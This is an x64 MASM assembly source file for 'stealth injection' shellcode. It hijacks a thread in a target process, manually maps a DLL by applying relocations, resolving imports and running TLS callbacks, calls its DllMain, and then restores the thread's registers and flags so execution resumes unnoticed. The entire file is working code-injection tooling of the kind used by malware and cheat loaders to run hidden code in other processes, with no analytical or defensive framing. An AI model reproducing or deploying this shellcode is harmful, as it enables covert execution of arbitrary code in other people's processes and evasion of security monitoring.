;******************************************************************************
;   Stealth Injection Shellcode for Thread Hijacking
;   
;   Assembled with: ml64.exe /c /Fo stealth_shellcode.obj stealth_shellcode.asm
;   
;   This shellcode is designed to run in a hijacked thread context.
;   It saves XMM registers, performs manual mapping, calls DllMain,
;   signals completion, restores all registers, returns to original execution.
;******************************************************************************

.CODE

;------------------------------------------------------------------------------
; HIJACK_CONTEXT structure offsets - MUST match stealth_shellcode.hpp!
;------------------------------------------------------------------------------
CTX_Lock                EQU 000h
CTX_Completed           EQU 004h
CTX_Result              EQU 008h
CTX_ErrorCode           EQU 00Ch

CTX_OriginalRip         EQU 010h
CTX_OriginalRsp         EQU 018h
CTX_OriginalRax         EQU 020h
CTX_OriginalRbx         EQU 028h
CTX_OriginalRcx         EQU 030h
CTX_OriginalRdx         EQU 038h
CTX_OriginalRsi         EQU 040h
CTX_OriginalRdi         EQU 048h
CTX_OriginalRbp         EQU 050h
CTX_OriginalR8          EQU 058h
CTX_OriginalR9          EQU 060h
CTX_OriginalR10         EQU 068h
CTX_OriginalR11         EQU 070h
CTX_OriginalR12         EQU 078h
CTX_OriginalR13         EQU 080h
CTX_OriginalR14         EQU 088h
CTX_OriginalR15         EQU 090h
CTX_OriginalRflags      EQU 098h

; XMM registers (volatile in x64 ABI)
CTX_OriginalXmm0        EQU 0A0h
CTX_OriginalXmm1        EQU 0B0h
CTX_OriginalXmm2        EQU 0C0h
CTX_OriginalXmm3        EQU 0D0h
CTX_OriginalXmm4        EQU 0E0h
CTX_OriginalXmm5        EQU 0F0h

; PE Image info
CTX_ImageBase           EQU 100h
CTX_ImageSize           EQU 108h
CTX_EntryPointRva       EQU 110h
CTX_RelocDirRva         EQU 118h
CTX_RelocDirSize        EQU 120h
CTX_ImportDirRva        EQU 128h
CTX_ImportDirSize       EQU 130h
CTX_OriginalImageBase   EQU 138h
CTX_TlsDirRva           EQU 140h
CTX_TlsDirSize          EQU 148h

; Function pointers
CTX_pLoadLibraryA       EQU 150h
CTX_pGetProcAddress     EQU 158h
CTX_pNtFlushInstructionCache EQU 160h
CTX_pLdrpHandleTlsData  EQU 168h
CTX_pRtlExitUserThread  EQU 170h
CTX_IsHijackedThread    EQU 178h

;------------------------------------------------------------------------------
; HijackShellcodeV2
; 
; Input:  RCX = pointer to HIJACK_CONTEXT
; Output: Returns to OriginalRip after DllMain completes
;
; This is the ONLY shellcode function - properly handles register save/restore
;------------------------------------------------------------------------------
HijackShellcodeV2 PROC

    ; RCX = HIJACK_CONTEXT pointer
    
    ; === Save XMM registers immediately (they're volatile) ===
    ; Use movups (unaligned) - does not require 16-byte alignment
    ; This is safer than movaps even though context is page-aligned
    movups  xmmword ptr [rcx + CTX_OriginalXmm0], xmm0
    movups  xmmword ptr [rcx + CTX_OriginalXmm1], xmm1
    movups  xmmword ptr [rcx + CTX_OriginalXmm2], xmm2
    movups  xmmword ptr [rcx + CTX_OriginalXmm3], xmm3
    movups  xmmword ptr [rcx + CTX_OriginalXmm4], xmm4
    movups  xmmword ptr [rcx + CTX_OriginalXmm5], xmm5
    
    ; === Save RFLAGS immediately (before any flag-modifying instructions) ===
    ; movups does NOT modify flags, so RFLAGS still contains original values
    ; Must save before: test, cmp, bt, sub, add, dec, and, or, shr, etc.
    pushfq
    pop     qword ptr [rcx + CTX_OriginalRflags]
    
    ; === Setup stack frame with proper alignment ===
    ; x64 ABI: RSP must be 16-byte aligned BEFORE call instruction
    ; call pushes 8-byte return address, so we need (16n + 8) before call
    push    rbp
    mov     rbp, rsp
    
    ; Save all non-volatile registers we'll use
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    
    ; Stack alignment math:
    ; - Entry: RSP = 16n+8 (kernel sets (original & ~0xF) - 8)
    ; - After push rbp: RSP = 16n (aligned)
    ; - After 7 more pushes (56 bytes): RSP = 16n - 56 = 16m + 8
    ; - After sub 28h (40): RSP = 16m + 8 - 40 = 16k (aligned for calls)
    ; x64 ABI: RSP must be 16-aligned before CALL instruction
    sub     rsp, 28h                    ; 0x20 shadow + 0x8 alignment = 0x28
    
    ; === Save context pointer in non-volatile register ===
    mov     rbx, rcx                    ; RBX = context (preserved across calls)
    
    ; === Process TLS if LdrpHandleTlsData is available ===
    ; LdrpHandleTlsData is an internal ntdll function, may not be exported
    ; Signature: NTSTATUS LdrpHandleTlsData(PVOID BaseAddress)
    mov     rax, [rbx + CTX_pLdrpHandleTlsData]
    test    rax, rax
    jz      skip_tls
    cmp     qword ptr [rbx + CTX_TlsDirSize], 0
    jz      skip_tls
    
    ; Call LdrpHandleTlsData(ImageBase) - already have shadow space allocated
    mov     rcx, [rbx + CTX_ImageBase]
    call    rax
    ; Ignore return value - TLS init failure is not fatal
skip_tls:

    ; === Process Relocations ===
    mov     rax, [rbx + CTX_ImageBase]
    sub     rax, [rbx + CTX_OriginalImageBase]
    mov     rsi, rax                    ; RSI = delta
    test    rsi, rsi
    jz      skip_reloc
    cmp     qword ptr [rbx + CTX_RelocDirSize], 0
    jz      skip_reloc
    
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_RelocDirRva]
    mov     r13, r12
    add     r13, [rbx + CTX_RelocDirSize]

reloc_block_loop:
    cmp     r12, r13
    jae     skip_reloc
    mov     r14d, dword ptr [r12]       ; VirtualAddress
    mov     r15d, dword ptr [r12 + 4]   ; SizeOfBlock
    cmp     r15d, 8
    jbe     next_block
    lea     ecx, [r15 - 8]
    shr     ecx, 1
    lea     rdx, [r12 + 8]

entry_loop:
    test    ecx, ecx
    jz      next_block
    movzx   eax, word ptr [rdx]         ; Read relocation entry (2 bytes)
    
    ; Extract type from bits 12-15
    mov     edi, eax
    shr     edi, 12
    
    ; Handle different relocation types
    cmp     edi, 0                      ; IMAGE_REL_BASED_ABSOLUTE (padding, skip)
    je      skip_entry
    cmp     edi, 0Ah                    ; IMAGE_REL_BASED_DIR64 (64-bit address)
    jne     skip_entry                  ; Skip unknown types
    
    ; Apply 64-bit relocation: *(ImageBase + VirtualAddress + offset) += delta
    and     eax, 0FFFh                  ; Extract offset (bits 0-11)
    movsxd  rax, eax
    add     rax, r14                    ; + VirtualAddress (page RVA)
    add     rax, [rbx + CTX_ImageBase]  ; + ImageBase = absolute address
    add     qword ptr [rax], rsi        ; Add delta to the 64-bit value
    
skip_entry:
    add     rdx, 2                      ; Next entry (2 bytes each)
    dec     ecx
    jmp     entry_loop
next_block:
    add     r12, r15
    jmp     reloc_block_loop
skip_reloc:

    ; === Process Imports ===
    cmp     qword ptr [rbx + CTX_ImportDirSize], 0
    jz      skip_imports
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_ImportDirRva]

import_loop:
    mov     eax, dword ptr [r12 + 0Ch]  ; Name RVA
    test    eax, eax
    jz      skip_imports
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    
    ; Call LoadLibraryA(dll_name) - shadow space already reserved in prologue
    mov     rcx, rax                    ; arg1 = dll name
    call    qword ptr [rbx + CTX_pLoadLibraryA]
    test    rax, rax
    jz      fail
    mov     r14, rax                    ; R14 = module handle
    
    mov     eax, dword ptr [r12]        ; OriginalFirstThunk
    test    eax, eax
    jnz     use_oft
    mov     eax, dword ptr [r12 + 10h]  ; Use FirstThunk if OFT is 0
use_oft:
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     r15, rax                    ; R15 = lookup thunk
    mov     eax, dword ptr [r12 + 10h]  ; FirstThunk (IAT)
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rdi, rax                    ; RDI = IAT entry

thunk_loop:
    mov     rax, qword ptr [r15]
    test    rax, rax
    jz      next_descriptor
    bt      rax, 63
    jnc     by_name
    movzx   edx, ax                     ; ordinal
    jmp     do_getproc
by_name:
    add     rax, [rbx + CTX_ImageBase]
    add     rax, 2                      ; skip Hint
    mov     rdx, rax                    ; function name
do_getproc:
    ; Call GetProcAddress(hModule, lpProcName/ordinal)
    mov     rcx, r14                    ; arg1 = module handle
    ; rdx already set to name or ordinal
    call    qword ptr [rbx + CTX_pGetProcAddress]
    test    rax, rax
    jz      fail
    mov     qword ptr [rdi], rax        ; Store in IAT
    add     r15, 8                      ; Next INT entry
    add     rdi, 8                      ; Next IAT entry
    jmp     thunk_loop
next_descriptor:
    add     r12, 14h                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR)
    jmp     import_loop
skip_imports:

    ; === Flush instruction cache ===
    mov     rax, [rbx + CTX_pNtFlushInstructionCache]
    test    rax, rax
    jz      skip_flush
    
    ; NtFlushInstructionCache(ProcessHandle, BaseAddress, Length)
    mov     rcx, -1                     ; arg1 = NtCurrentProcess() = -1
    mov     rdx, [rbx + CTX_ImageBase]  ; arg2 = BaseAddress
    mov     r8, [rbx + CTX_ImageSize]   ; arg3 = Length
    call    rax
skip_flush:

    ; === Call DllMain(hinstDLL, fdwReason, lpvReserved) ===
    mov     rcx, [rbx + CTX_ImageBase]  ; arg1 = hinstDLL
    mov     edx, 1                      ; arg2 = DLL_PROCESS_ATTACH
    xor     r8, r8                      ; arg3 = lpvReserved = NULL
    
    ; Calculate entry point address
    mov     rax, [rbx + CTX_ImageBase]
    add     rax, [rbx + CTX_EntryPointRva]
    
    ; Check if entry point is 0 (DLL without entry point)
    cmp     qword ptr [rbx + CTX_EntryPointRva], 0
    jz      no_entrypoint
    
    call    rax
    mov     dword ptr [rbx + CTX_Result], eax
    jmp     done

no_entrypoint:
    ; No entry point - consider it success
    mov     dword ptr [rbx + CTX_Result], 1
    jmp     done

fail:
    mov     dword ptr [rbx + CTX_Result], 0
    mov     dword ptr [rbx + CTX_ErrorCode], 1

done:
    ; === Signal completion (atomic write using XCHG with implicit LOCK) ===
    ; xchg with memory operand has implicit lock prefix - fully atomic
    mov     eax, 1
    xchg    dword ptr [rbx + CTX_Completed], eax
    
    ; === Check if this is a hijacked thread or a new thread ===
    ; Hijacked thread: restore all registers and return to OriginalRip
    ; New thread: call RtlExitUserThread(0) to terminate cleanly
    cmp     qword ptr [rbx + CTX_IsHijackedThread], 0
    je      exit_thread
    
    ; === Epilogue for HIJACKED thread: Restore everything and return ===
    
    ; First restore XMM from context (need RBX for addressing)
    ; Use movups (unaligned) for safety
    movups  xmm0, xmmword ptr [rbx + CTX_OriginalXmm0]
    movups  xmm1, xmmword ptr [rbx + CTX_OriginalXmm1]
    movups  xmm2, xmmword ptr [rbx + CTX_OriginalXmm2]
    movups  xmm3, xmmword ptr [rbx + CTX_OriginalXmm3]
    movups  xmm4, xmmword ptr [rbx + CTX_OriginalXmm4]
    movups  xmm5, xmmword ptr [rbx + CTX_OriginalXmm5]
    
    ; Restore GPRs from original context (thread was hijacked mid-execution)
    mov     rax, [rbx + CTX_OriginalRax]
    mov     rcx, [rbx + CTX_OriginalRcx]
    mov     rdx, [rbx + CTX_OriginalRdx]
    mov     rsi, [rbx + CTX_OriginalRsi]
    mov     rdi, [rbx + CTX_OriginalRdi]
    mov     r8,  [rbx + CTX_OriginalR8]
    mov     r9,  [rbx + CTX_OriginalR9]
    mov     r10, [rbx + CTX_OriginalR10]
    mov     r11, [rbx + CTX_OriginalR11]
    mov     r12, [rbx + CTX_OriginalR12]
    mov     r13, [rbx + CTX_OriginalR13]
    mov     r14, [rbx + CTX_OriginalR14]
    mov     r15, [rbx + CTX_OriginalR15]
    mov     rbp, [rbx + CTX_OriginalRbp]
    
    ; Setup stack to return to original RIP
    ; We completely replace RSP and push return address
    mov     rsp, [rbx + CTX_OriginalRsp]
    
    ; Restore RFLAGS before returning
    ; Push saved RFLAGS then popfq to restore
    push    qword ptr [rbx + CTX_OriginalRflags]
    popfq
    
    ; Push return address for ret instruction
    push    qword ptr [rbx + CTX_OriginalRip]
    
    ; Restore RBX absolutely last (we were using it for context addressing)
    mov     rbx, [rbx + CTX_OriginalRbx]
    
    ; Return to original execution point
    ret

exit_thread:
    ; === Epilogue for NEW thread: Exit cleanly ===
    ; This thread was created by RtlCreateUserThread, not hijacked
    ; We cannot restore original context (there is none)
    ; Call RtlExitUserThread(0) to terminate
    
    ; RtlExitUserThread(NTSTATUS ExitStatus)
    xor     ecx, ecx                    ; arg1 = 0 (STATUS_SUCCESS)
    mov     rax, [rbx + CTX_pRtlExitUserThread]
    jmp     rax                         ; Tail call - does not return

HijackShellcodeV2 ENDP

;------------------------------------------------------------------------------
; End marker label for size calculation (no code emitted)
;------------------------------------------------------------------------------
HijackShellcodeV2End:

END
